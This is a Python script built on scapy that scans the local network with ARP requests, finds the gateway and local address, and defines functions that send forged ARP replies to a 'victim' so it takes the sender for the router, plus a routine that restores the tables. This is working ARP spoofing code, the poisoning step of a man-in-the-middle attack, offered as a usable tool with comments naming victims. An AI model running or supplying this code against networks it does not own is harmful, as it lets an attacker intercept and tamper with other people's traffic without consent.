import scapy.all as scapy
import time
import socket, struct
import platform


def get_interface_names():
    int_names = ""
    if platform.system() == "Windows":
        int_names = scapy.get_windows_if_list()
    # for ethName in interface_list:
    #     if not ethName['name'] == "":
    #         print(ethName["name"])

    if platform.system() == "Linux":
        int_names = scapy.get_if_list()

    return int_names


# create arp packet
# op = 2 --> arp response
# pdst = destination ip (victim's ip)
# hwdst = mac address of the destination (victim;s mac add)
# psrc = source ip address
# basically it is telling victim's machine that my ip address is router's ip, source mac get sent automatically
def get_macadd(ip):
    arp_req = scapy.ARP(pdst=ip)
    bcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_bcast = bcast/arp_req
    ans_list = scapy.srp(arp_req_bcast, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


def arp_spoof(victim_ip, pretend_ip):
    try:
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_macadd(victim_ip), psrc=pretend_ip)

        # send the packet
        scapy.send(packet, verbose=False)
    except:
        print('spoof error')


def arp_spoof_restore(dest_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_macadd(dest_ip), psrc=source_ip, hwsrc=get_macadd(source_ip))
    # send the packet
    scapy.send(packet, verbose=False)


def get_gateway_ip():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))



#finding the local ip address of this machine
def get_local_ip_add():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
    local_ip_address = s.getsockname()[0]
   # print(local_ip_address)
    return local_ip_address

#finds all the host in the current network and returns mac address and ip
def get_all_host_in_current_network():
    ipnet = get_local_ip_add() + "/24"
    arp_req = scapy.ARP(pdst = ipnet)
    #arp_req.show() #will show the details

    #sending it to broadcast mac address
    bcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # creating a ethernet frame object
    #bcast.show()

    #combining the above two packets
    arp_req_bcast = bcast/arp_req
    #arp_req_bcast.show()

    #send the request
    #srp (sr=send receive) (p) allows to send it with custum ether layer
    #srp returns two lists (answered and unanswered list, which means while scanning the network,
    #it sends request to all the ip in the range and it will categorize the ip which exists and the ones which dosen't)
    #in the list, it contains couple with two elements( packet sent and answer)
    #put [0] at the end to capture only the first list

    ans_list = scapy.srp(arp_req_bcast, timeout=1, verbose=False)[0]

    net_list = []
    #iterate the list

    for element in ans_list:
        #print(element[1].show())
        #print(element[1].psrc) # will print ip
        #print(element[1].hwsrc) # will print mac address
        net_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        net_list.append(net_dict)
    return net_list


def print_ip_list_in_network():
    print("This are the following host found on your network")
    print("IP\t\t\t\t\t\tMAC Address\n...........................................")
    net_list = get_all_host_in_current_network()
    for ele in net_list:
        print(ele["ip"] + "\t\t\t" + ele["mac"])

